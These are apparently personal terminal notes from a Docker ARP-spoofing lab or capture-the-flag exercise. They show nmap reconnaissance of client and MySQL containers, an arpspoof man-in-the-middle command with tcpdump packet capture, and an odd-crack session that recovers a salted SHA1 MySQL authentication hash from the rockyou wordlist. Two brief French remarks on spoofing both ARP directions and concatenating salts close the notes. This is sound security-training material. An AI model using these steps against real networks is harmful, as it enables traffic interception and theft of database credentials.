apt update
apt upgrade
apt install iproute2 nmap ettercap-common iputils-ping dsniff tcpdump -y

root@fac50de5d760:~# ip a                                                     
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever

root@fac50de5d760:~# nmap -Pn 172.18.0.2/16
Starting Nmap 7.80 ( https://nmap.org ) at 2023-12-08 17:14 UTC
Nmap scan report for 172.18.0.1
Host is up (0.000026s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:D2:E1:B6:93 (Unknown)

Nmap scan report for client.arp-spoofing-dist-2_default (172.18.0.3)
Host is up (0.000035s latency).
All 1000 scanned ports on client.arp-spoofing-dist-2_default (172.18.0.3) are closed
MAC Address: 02:42:AC:12:00:03 (Unknown)

Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.4)
Host is up (0.000035s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:AC:12:00:04 (Unknown)
       
root@fac50de5d760:~# arp -a
client.arp-spoofing-dist-2_default (172.18.0.3) at 02:42:ac:12:00:03 [ether] on eth0
? (172.18.0.1) at 02:42:d2:e1:b6:93 [ether] on eth0
db.arp-spoofing-dist-2_default (172.18.0.4) at 02:42:ac:12:00:04 [ether] on eth0

sudo apt-get install dsniff
sudo arpspoof -i [interface] -t [target IP] [gateway IP]
sudo tcpdump -i eth0 -w capture.pcap


[axel@fedora test]$ odd-crack 'hex(sha1_raw($p)+sha1_raw($s.sha1_raw(sha1_raw($p))))' --salt hex:373658130a0e522531223c2b4e663b4c12721f0f /home/axel/Downloads/rockyou.txt 8b688889fcd8259818adf02f87bc028b8927b742
[*] loading file...
[*] found heyheyhey=8b688889fcd8259818adf02f87bc028b8927b742
[*] all hashes found, shutdown requested
[*] done, tried 4700 passwords


Il faut spoof les 2 ARP

il faut concaténer les 2 salt putain